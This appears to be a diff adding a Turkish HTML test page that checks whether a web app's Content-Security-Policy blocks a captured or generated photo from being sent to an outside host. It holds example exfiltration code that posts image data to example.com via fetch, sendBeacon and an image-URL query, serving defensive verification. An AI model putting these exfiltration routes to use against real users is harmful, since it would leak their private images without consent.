@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<!--
+  Bu sayfa uygulamanın CSP'sinin AYNISINI taşır (index.html ile birebir).
+  CSP her sayfaya kendi meta'sıyla uygulanır; testin gerçek korumayı
+  yansıtması için buraya da konmalı. Değiştirilmez — index.html'deki neyse o.
+-->
+<meta http-equiv="Content-Security-Policy" content="
+  default-src 'self';
+  script-src 'self' 'unsafe-inline' 'wasm-unsafe-eval' https://www.gstatic.com https://accounts.google.com;
+  style-src 'self' 'unsafe-inline';
+  img-src 'self' data: blob: https://kstgkilkacurypxadavc.supabase.co https://i.ytimg.com;
+  media-src 'self' blob: data: https://kstgkilkacurypxadavc.supabase.co;
+  font-src 'self' data: https://fonts.gstatic.com;
+  connect-src 'self' https://kstgkilkacurypxadavc.supabase.co wss://kstgkilkacurypxadavc.supabase.co https://*.googleapis.com https://www.gstatic.com https://fonts.gstatic.com https://accounts.google.com;
+  frame-src https://www.youtube.com https://www.youtube-nocookie.com https://accounts.google.com;
+  worker-src 'self' blob:;
+  object-src 'none';
+  base-uri 'self';
+  form-action 'self';
+">
+<title>KPSS NET — Dışarı gönderme koruması testi</title>
+<style>
+  :root { color-scheme: light dark; }
+  * { box-sizing: border-box; }
+  body { margin:0; font-family: system-ui,-apple-system,sans-serif; background:#f5f5f7; color:#111; padding:16px; line-height:1.5; }
+  @media (prefers-color-scheme: dark){ body{background:#101614;color:#eee;} .kart{background:#1a201e!important;} }
+  h1{font-size:20px;margin:0 0 4px;} .alt{font-size:13px;opacity:.7;margin:0 0 16px;}
+  .kart{background:#fff;border-radius:16px;padding:16px;margin-bottom:16px;box-shadow:0 1px 4px rgba(0,0,0,.08);}
+  .kart h2{font-size:16px;margin:0 0 6px;} .kart p.k{font-size:13px;opacity:.75;margin:0 0 10px;}
+  button{font-size:15px;font-weight:600;padding:12px 16px;border:none;border-radius:12px;color:#fff;width:100%;margin-bottom:8px;cursor:pointer;}
+  .dis{background:#b3261e;} .ic{background:#0F8060;} .ikincil{background:#555;}
+  .durum{font-size:13px;padding:10px;border-radius:8px;margin-top:8px;white-space:pre-wrap;font-family:ui-monospace,monospace;}
+  .ok{background:rgba(15,128,96,.15);} .hata{background:rgba(200,40,40,.15);}
+  img{max-width:120px;border-radius:8px;margin-top:8px;}
+  .harita{font-size:13px;} .harita code{background:rgba(128,128,128,.2);padding:1px 5px;border-radius:4px;}
+  .harita li{margin-bottom:6px;}
+</style>
+</head>
+<body>
+  <h1>Dışarı gönderme koruması — canlı test</h1>
+  <p class="alt">Bu sayfa uygulamanın parçası değildir. Amaç: "biri uygulamaya sızıp bir fotoğrafı uygulama DIŞINA göndermeye kalkarsa engellenir mi?" sorusunu gözle görmek. Gerçek veri hiçbir yere gitmez — koruma zaten engelliyor.</p>
+
+  <div class="kart">
+    <h2>1) Test görüntüsü</h2>
+    <p class="k">Denemede kullanılacak fotoğraf. İstersen gerçek kameradan çek, istersen hazır bir görüntü üret.</p>
+    <button class="ikincil" id="uret">Hazır görüntü üret</button>
+    <button class="ikincil" id="cek">Kameradan çek (izin ister)</button>
+    <img id="onizleme" alt="" style="display:none">
+    <div class="durum" id="foto">Henüz görüntü yok.</div>
+  </div>
+
+  <div class="kart">
+    <h2>2) Uygulama DIŞINA göndermeyi dene</h2>
+    <p class="k">Saldırganın yapmaya çalışacağı şey: fotoğrafı kendi adresine (dış adres) yollamak. Üç yol da denenir; koruma hepsini engellemeli.</p>
+    <button class="dis" id="disari">Dışarıya göndermeyi dene (example.com)</button>
+    <div class="durum" id="disDurum">Henüz denenmedi.</div>
+  </div>
+
+  <div class="kart">
+    <h2>3) Uygulamanın KENDİ sunucusuna göndermeyi dene</h2>
+    <p class="k">Karşılaştırma için: aynı fotoğrafı uygulamanın kendi arka ucuna (Supabase) yollamak. Bu izinli olmalı — fark buradan görünür.</p>
+    <button class="ic" id="iceri">Kendi sunucusuna göndermeyi dene</button>
+    <div class="durum" id="icDurum">Henüz denenmedi.</div>
+  </div>
+
+  <div class="kart harita">
+    <h2>Hangi kod nerede, ne işe yarıyor?</h2>
+    <ul>
+      <li><b>Koruma:</b> <code>web/index.html</code> içindeki <code>Content-Security-Policy</code> (CSP) meta etiketi.</li>
+      <li><b>Dışarı göndermeyi engelleyen satırlar:</b> <code>connect-src</code> (fetch/XHR/WebSocket/sendBeacon) ve <code>img-src</code> (görsel ile veri kaçırma). Yalnızca uygulamanın kendi adreslerine (Supabase, Google, YouTube) izin verir.</li>
+      <li><b>Bu test:</b> yukarıdaki denemeler <code>securitypolicyviolation</code> olayını dinler; engelleyen kuralın adını (connect-src / img-src) sana yazar.</li>
+    </ul>
+  </div>
+
+<script>
+(function () {
+  var veri = null; // gönderilecek görüntünün baytları (Blob)
+  var ihlaller = [];
+  document.addEventListener('securitypolicyviolation', function (e) {
+    ihlaller.push({ uri: e.blockedURI, kural: e.effectiveDirective });
+  });
+  function yaz(id, t, s){ var el=document.getElementById(id); el.textContent=t; el.className='durum '+(s||''); }
+
+  function canvasGorsel() {
+    var c = document.createElement('canvas'); c.width=160; c.height=120;
+    var x = c.getContext('2d');
+    x.fillStyle='#0F8060'; x.fillRect(0,0,160,120);
+    x.fillStyle='#fff'; x.font='16px sans-serif'; x.fillText('TEST', 50, 66);
+    return c;
+  }
+  function goster(c){ var img=document.getElementById('onizleme'); img.src=c.toDataURL('image/jpeg',.9); img.style.display='block'; }
+
+  document.getElementById('uret').onclick = function () {
+    var c = canvasGorsel(); goster(c);
+    c.toBlob(function (b) { veri = b; yaz('foto','Hazır görüntü üretildi ('+Math.round(b.size/1024*10)/10+' KB).','ok'); }, 'image/jpeg', .9);
+  };
+
+  document.getElementById('cek').onclick = async function () {
+    yaz('foto','Kamera izni isteniyor…');
+    try {
+      var akis = await navigator.mediaDevices.getUserMedia({ video:{facingMode:'user'}, audio:false });
+      var v = document.createElement('video'); v.srcObject=akis; v.muted=true; await v.play();
+      await new Promise(function(r){ setTimeout(r, 400); });
+      var c = document.createElement('canvas'); c.width=v.videoWidth||160; c.height=v.videoHeight||120;
+      c.getContext('2d').drawImage(v,0,0,c.width,c.height);
+      akis.getTracks().forEach(function(t){ t.stop(); });
+      goster(c);
+      c.toBlob(function (b) { veri=b; yaz('foto','Kameradan gerçek fotoğraf alındı ('+Math.round(b.size/1024*10)/10+' KB). Şimdi bunu dışarı göndermeyi dene.','ok'); }, 'image/jpeg', .9);
+    } catch (e) { yaz('foto','Kamera alınamadı: '+e.name+' — '+e.message+'\n(Sorun değil, "Hazır görüntü üret" ile de test edebilirsin.)','hata'); }
+  };
+
+  function gorselYoksa(id){ if(!veri){ yaz(id,'Önce 1. adımdan bir görüntü hazırla.','hata'); return true; } return false; }
+
+  document.getElementById('disari').onclick = async function () {
+    if (gorselYoksa('disDurum')) return;
+    ihlaller = [];
+    var sonuc = [];
+    // (a) fetch POST
+    try { await fetch('https://example.com/al', {method:'POST', body:veri}); sonuc.push('fetch POST: GEÇTİ (!)'); }
+    catch (e) { sonuc.push('fetch POST: engellendi ('+e.message+')'); }
+    // (b) sendBeacon
+    try { var ok = navigator.sendBeacon('https://example.com/beacon', veri); sonuc.push('sendBeacon: '+(ok?'kuyruğa alındı ama':'reddedildi')); }
+    catch (e) { sonuc.push('sendBeacon: engellendi'); }
+    // (c) img GET
+    var img = new Image(); img.src = 'https://example.com/x.png?d=veri';
+    await new Promise(function(r){ setTimeout(r, 700); });
+
+    var engel = ihlaller.filter(function(i){ return i.uri.indexOf('example.com')>=0; });
+    var kurallar = Array.from(new Set(engel.map(function(i){ return i.kural; }))).join(', ');
+    var basari = engel.length >= 2; // en az fetch + img engellenmeli
+    yaz('disDurum',
+      (basari ? '✅ ENGELLENDİ — fotoğraf dışarı gönderilemedi.\n' : '⚠️ Beklenmedik: bazı yollar açık kaldı.\n') +
+      'Durduran kural: ' + (kurallar || '—') + '\n\n' +
+      'Denemeler:\n· ' + sonuc.join('\n· ') + '\n\n' +
+      'CSP ihlalleri (' + engel.length + '):\n' +
+      engel.map(function(i){ return '· '+i.kural+' → '+i.uri; }).join('\n'),
+      basari ? 'ok' : 'hata');
+  };
+
+  document.getElementById('iceri').onclick = async function () {
+    if (gorselYoksa('icDurum')) return;
+    ihlaller = [];
+    var url = 'https://kstgkilkacurypxadavc.supabase.co/rest/v1/';
+    var mesaj;
+    try {
+      // Kimlik göndermiyoruz; sunucu 401 dönebilir. ÖNEMLİ olan CSP'nin
+      // engellememesi — yani isteğin adrese ULAŞABİLMESİ.
+      var r = await fetch(url, { method:'GET' });
+      mesaj = '✅ İZİNLİ — istek uygulamanın kendi sunucusuna ulaştı (HTTP '+r.status+').\nCSP engellemedi; fark bu: dışarı kapalı, kendi arka ucu açık.';
+    } catch (e) {
+      var csp = ihlaller.some(function(i){ return i.uri.indexOf('supabase')>=0; });
+      mesaj = csp
+        ? '⚠️ CSP kendi sunucusunu da engelledi — allowlist yanlış olabilir.'
+        : '✅ İZİNLİ — CSP engellemedi (ağ/kimlik hatası ayrı: '+e.message+').';
+    }
+    yaz('icDurum', mesaj, 'ok');
+  };
+})();
+</script>
+</body>
+</html>
